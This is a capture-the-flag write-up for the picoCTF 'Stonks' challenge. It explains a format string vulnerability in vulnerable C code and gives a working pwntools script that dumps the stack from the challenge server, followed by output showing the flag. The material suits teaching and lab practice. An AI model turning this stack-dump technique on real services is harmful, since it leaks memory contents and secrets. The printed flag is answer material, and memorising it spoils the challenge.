# Stonks

Reading through the `vuln.c` file, what immediately seems interesting is the `buy_stonks` function.
In this snippet, we see that `api_buf` is read from a file; we need some way to view this data.

```c
// buy_stonks:
    char api_buf[FLAG_BUFFER];
	FILE *f = fopen("api","r");
	if (!f) {
		printf("...");
		exit(1);
	}
	fgets(api_buf, FLAG_BUFFER, f);
```

Going further down the function we see a snippet that reads a token from user input.

```c
    char *user_buf = malloc(300 + 1);
	printf("What is your API token?\n");
	scanf("%300s", user_buf);
	printf("Buying stonks with token:\n");
	printf(user_buf);
```

This feels like the most optimal place to exploit. Initially, I thought this could be a buffer overflow
vulnerability that we could somehow use to dump our stack. Turns out its a lot simpler than that.
C leaves room for arbitrary user input to get interpreted as a format argument when we `printf(user_buf)`.
This is called a [Format String Vulnerability](https://ctf101.org/binary-exploitation/what-is-a-format-string-vulnerability/). We can leverage this to dump the stack by providing arbitrary
format arguments. 

I took inspiration from [this writeup](https://ctftime.org/writeup/28935) on stonks and wrote a script
with [`pwntools`](https://pwntools.com).

```py
from pwn import *

r = remote("mercury.picoctf.net", "6989")

# the format arguments we use to dump the stack
# %x will output an integer (32-bit) in hex form, so we just send a load
# of %x's to dump as much of the stack as we can.
format_string = '-'.join(["%x" for _ in range(0, 32)])

# we don't really need to wait cuz our input will be buffered anyway
r.send(b"1\n")
r.send(bytes(format_string + '\n', encoding="ascii"))

# skip till the line relevant to us
_ = r.recvuntil("Buying stonks with token:\n")
out = r.recvline()

stack = b""

# now we have our stack data, we can interpret it as ascii and print what we find
for int32 in out.decode().split('-'):
    stack += p32(int(int32, 16))

print(stack.decode(encoding="ascii", errors="replace"))
```

Here's the output after running the script

```
►��     ����-������☺`�� ►☺���-�����     ☻���    ►��     picoCTF{I_l05t_4ll_my_m0n3y_0a853e52}������@♦��h?i☺�����►���%��
[*] Closed connection to mercury.picoctf.net port 6989
```

Which has our flag!
